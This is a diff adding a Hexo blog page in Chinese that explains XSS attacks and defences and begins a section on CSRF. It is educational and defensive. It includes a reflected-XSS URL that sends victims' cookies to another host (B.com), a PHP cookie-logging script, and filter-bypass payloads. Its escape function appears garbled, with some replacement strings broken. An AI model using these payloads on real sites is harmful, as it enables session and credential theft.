@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"catcherinsky.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="XSSXSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。 跨站脚本攻击有可能造成以下影响:  利用虚假输入表单骗取用户个人信息。 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全">
+<meta property="og:url" content="http://catcherinsky.github.io/2021/08/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Knowlegde Bases of CatcherInSky">
+<meta property="og:description" content="XSSXSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。 跨站脚本攻击有可能造成以下影响:  利用虚假输入表单骗取用户个人信息。 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-da3258e217ccc2b9cff316d97487f83e_hd.jpg#id=Prrty&originHeight=149&originWidth=732&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-cf4f8235303f0892d2a50fe480b9d480_hd.jpg#id=cyQXY&originHeight=185&originWidth=595&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-73842ddf6a856a44c3d4364c49e5e108_hd.jpg#id=ocJAM&originHeight=114&originWidth=652&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-226050bcad33410428e71165b2410440_hd.jpg#id=pjFfJ&originHeight=303&originWidth=432&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-5f5c6de58fcbc58703b3a3d83284e942_hd.jpg#id=VidmZ&originHeight=406&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-c549af63c3f0a490c9c24b5ce21155c8_hd.jpg#id=I95M9&originHeight=388&originWidth=548&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/106384/1630054543248-3cf44eb2-4408-4153-a9dc-76a0aa8cc183.png#clientId=u1454f11f-1aed-4&from=paste&id=u8a07563f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=691&originalType=url%E2%88%B6=1&size=159914&status=done&style=none&taskId=u2ce0e1c0-0d7a-4a8a-bebc-53d76f0c03f">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-f707cdf092aa93c96b584466cac8b69d_hd.jpg#id=ugefo&originHeight=180&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ad9ead59259fbb7a7cd5b271961e02d4_hd.jpg#id=OS6g9&originHeight=276&originWidth=643&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-eeef7a581d7287456102267effd983ab_hd.jpg#id=jr9h5&originHeight=134&originWidth=741&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-dcd9762b8ded41ecc3c898298716a620_hd.jpg#id=LVWhw&originHeight=153&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-25fab61ba77534f745fa6272234b593c_hd.jpg#id=RopfN&originHeight=312&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-be9253c625dcb1353567372d0165bf57_hd.jpg#id=YsgvL&originHeight=179&originWidth=716&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-78f3e30a0c902152067da516a1039938_hd.jpg#id=dhZdw&originHeight=154&originWidth=657&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-a5360fba67b2b26fa0f118e77e4434aa_hd.jpg#id=OkLQe&originHeight=285&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-1f3a0e8522f0b9d7edd5d110d14564f7_hd.jpg#id=TuQd6&originHeight=299&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-988535b2a6d99f036bb965c39d140d42_hd.jpg#id=HTibR&originHeight=202&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-310c95a5cc63e1526edd1548ea8b9178_hd.jpg#id=mzoWR&originHeight=394&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-b9818e3cc9a6991dbc52b6813d3e03a9_hd.jpg#id=tq7tr&originHeight=394&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none">
+<meta property="article:published_time" content="2021-08-27T07:39:35.000Z">
+<meta property="article:modified_time" content="2022-02-14T11:41:05.929Z">
+<meta property="article:author" content="CatcherInSky">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic3.zhimg.com/80/v2-da3258e217ccc2b9cff316d97487f83e_hd.jpg#id=Prrty&originHeight=149&originWidth=732&originalType=binary%E2%88%B6=1&status=done&style=none">
+
+<link rel="canonical" href="http://catcherinsky.github.io/2021/08/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>网络安全 | Knowlegde Bases of CatcherInSky</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+  <meta name="referrer" content="same-origin">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Knowlegde Bases of CatcherInSky</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CatcherInSky的前端知识库</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="CatcherInSky">
+      <meta itemprop="description" content="CatcherInSky的前端知识库">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网络安全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-27 15:39:35" itemprop="dateCreated datePublished" datetime="2021-08-27T15:39:35+08:00">2021-08-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-14 19:41:05" itemprop="dateModified" datetime="2022-02-14T19:41:05+08:00">2022-02-14</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。</p>
+<p>跨站脚本攻击有可能造成以下影响:</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息。</li>
+<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片。</li>
+</ul>
+<p><strong>XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的</strong>。</p>
+<p><strong>理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在 XSS 漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于 script。</strong></p>
+<p>XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。</p>
+<h3 id="非持久型-XSS（反射型-XSS）"><a href="#非持久型-XSS（反射型-XSS）" class="headerlink" title="非持久型 XSS（反射型 XSS）"></a>非持久型 XSS（反射型 XSS）</h3><p>非持久型 XSS 漏洞，一般是通过给别人发送<strong>带有恶意脚本代码参数的 URL</strong>，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-da3258e217ccc2b9cff316d97487f83e_hd.jpg#id=Prrty&originHeight=149&originWidth=732&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>假设某网站 <a target="_blank" rel="noopener" href="http://a.com/">http://A.com</a> 的某个输入框存在 XSS 漏洞，能通过输入框或者 URL 传入脚本执行。比如它的后端 php 代码是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ];</span><br></pre></td></tr></table></figure>
+
+<p>那么，就可以在 url 中传入参数 name。生成 <strong>恶意 url</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.<span class="property">com</span>/?name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;B.com/ck.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>ck.php 文件代码如下，将获得的 cookie 存入 cookie.txt。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_GET[&#x27;c&#x27;];</span><br><span class="line">$ip = getenv (&#x27;REMOTE_ADDR&#x27;);</span><br><span class="line">$time=date(&quot;j F, Y, g:i a&quot;);</span><br><span class="line">$referer=getenv (&#x27;HTTP_REFERER&#x27;);</span><br><span class="line">$fp = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);</span><br><span class="line">fwrite($fp, &#x27;Cookie: &#x27;.$cookie.&quot;\n&quot;.&#x27;IP: &#x27;.$ip.&quot;\n&quot;.&#x27;Date and Time: &#x27;.$time.&quot;\n&quot;.&#x27;Referer: &#x27;.$referer.&quot;\n\n&quot;);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
+
+<p>通过短域名生成网站,将上诉 <strong>恶意 url</strong> 映射成类似<a target="_blank" rel="noopener" href="http://dwz.cn/B4l3Ydke%E7%9A%84%E7%BD%91%E5%9D%80%E6%AC%BA%E9%AA%97%E7%94%A8%E6%88%B7%EF%BC%8C%E5%8F%91%E9%80%81%E7%BB%99%E5%B7%B2%E7%BB%8F%E5%9C%A8[http://A.com](http://a.com/)%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E4%B9%8B%E5%90%8E%EF%BC%8Ccookie%E4%BF%A1%E6%81%AF%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%BF%9D%E5%AD%98%E5%88%B0">http://dwz.cn/B4l3Ydke的网址欺骗用户，发送给已经在[http://A.com](http://a.com/)登录的用户，用户点击之后，cookie信息就会自动保存到</a> <a target="_blank" rel="noopener" href="http://b.com/">http://B.com</a>下的 cookie.txt 中。</p>
+<p>通常，后端不会这么如此信任用户输入，会对各种输入进行正则过滤限制。针对各种过滤出现了对应的恶意 payload, 通过事件、通过协议、通过请求。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Script</span>&gt; 恶意代码 &lt;/script&gt;</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt; 恶意代码 &lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">&quot; 恶意代码 &quot;</span> &gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed;top:0;left:0;bottom:0;right:0;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot; 恶意代码 &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">...</span></span><br></pre></td></tr></table></figure>
+
+<p>以下代码通过 base64 编码，依旧能实现恶意攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以直接通过 URL (类似：<code>https://xxx.com/xxx?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>) 注入可执行的脚本代码。不过一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击。</p>
+<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。</li>
+<li>攻击者需要诱骗点击,必须要通过用户点击链接才能发起</li>
+<li>反馈率低，所以较难发现和响应修复</li>
+<li>盗取用户敏感保密信息</li>
+</ul>
+<h4 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h4><ul>
+<li>Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。</li>
+<li>尽量不要从 <code>URL</code>，<code>document.referrer</code>，<code>document.forms</code> 等这种 DOM API 中获取数据直接渲染。</li>
+<li>尽量不要使用 <code>eval</code>, <code>new Function()</code>，<code>document.write()</code>，<code>document.writeln()</code>，<code>window.setInterval()</code>，<code>window.setTimeout()</code>，<code>innerHTML</code>，<code>document.createElement()</code>等可执行字符串的方法。</li>
+<li>如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义。</li>
+<li>前端渲染的时候对任何的字段都需要做 escape 转义编码。</li>
+</ul>
+<h3 id="持久型-XSS（存储型-XSS）"><a href="#持久型-XSS（存储型-XSS）" class="headerlink" title="持久型 XSS（存储型 XSS）"></a>持久型 XSS（存储型 XSS）</h3><p>持久型 XSS 漏洞，一般存在于 Form 表单提交等交互功能，如文章留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。</p>
+<p><img src="https://pic1.zhimg.com/80/v2-cf4f8235303f0892d2a50fe480b9d480_hd.jpg#id=cyQXY&originHeight=185&originWidth=595&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容</p>
+<p><img src="https://pic1.zhimg.com/80/v2-73842ddf6a856a44c3d4364c49e5e108_hd.jpg#id=ocJAM&originHeight=114&originWidth=652&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于<strong>后端从数据库中读出来的数据</strong> 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。</p>
+<h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul>
+<li>POST 请求提交表单后端没做转义直接入库。</li>
+<li>后端从数据库中取出数据没做转义直接输出给前端。</li>
+<li>前端拿到后端数据没做转义直接渲染成 DOM。</li>
+</ul>
+<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>持久性，植入在数据库中</li>
+<li>盗取用户敏感私密信息</li>
+<li>危害面广</li>
+</ul>
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>客户端脚本通过 DOM 动态输出数据到页面，而不经过服务器，纯粹发生在客户端的攻击。 当前端出现以下代码时，就要小心了，确保等号右边的内容可控。实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。<br>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">write</span> =</span><br><span class="line">innerHTML =</span><br><span class="line"><span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的例子</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时可以通过以下payload注入</span></span><br><span class="line">A.<span class="property">com</span>?<span class="keyword">default</span>=<span class="title class_">German</span>#&lt;script&gt; 恶意代码 &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>大部分 xss 都是为了获得 cookie，进行下一步的破坏，因此系统层面也应考虑 cookie 有效期，HttpOnly 等方式。</strong></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
+<p>通常可以通过两种方式来开启 CSP：</p>
+<ol>
+<li>设置 HTTP Header 中的 Content-Security-Policy</li>
+<li>设置 meta 标签的方式</li>
+</ol>
+<p>这里以设置 HTTP Header 来举例：</p>
+<ul>
+<li>只允许加载本站资源</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>只允许加载 HTTPS 协议图片</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: img-src https://*</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>允许加载任何来源框架</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: child-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如需了解更多属性，请查看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy 文档</a></p>
+<p>对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。</p>
+<h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><p>用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  str = str.replace(/`/g, &#x27;</span><span class="string">`&#x27;)</span></span><br><span class="line"><span class="string">  str = str.replace(/\//g, &#x27;/&#x27;)</span></span><br><span class="line"><span class="string">  return str</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="built_in">require</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> html = <span class="title function_">xss</span>(<span class="string">&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html);</span><br></pre></td></tr></table></figure>
+
+<p>以上示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。</p>
+<h4 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h4><p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。</p>
+<h3 id="富文本编辑器中-XSS-攻击的防范"><a href="#富文本编辑器中-XSS-攻击的防范" class="headerlink" title="富文本编辑器中 XSS 攻击的防范"></a>富文本编辑器中 XSS 攻击的防范</h3><ol>
+<li>建立白名单就好，保留要用的标签，其他全部过滤</li>
+<li>入数据库的时候 转义为实体字符，出库的时候还原，并过滤掉以下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br><span class="line">javascript:xxx;</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>​</strong></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的 Web 攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>下面先介绍一下 CSRF 攻击的原理：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-226050bcad33410428e71165b2410440_hd.jpg#id=pjFfJ&originHeight=303&originWidth=432&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
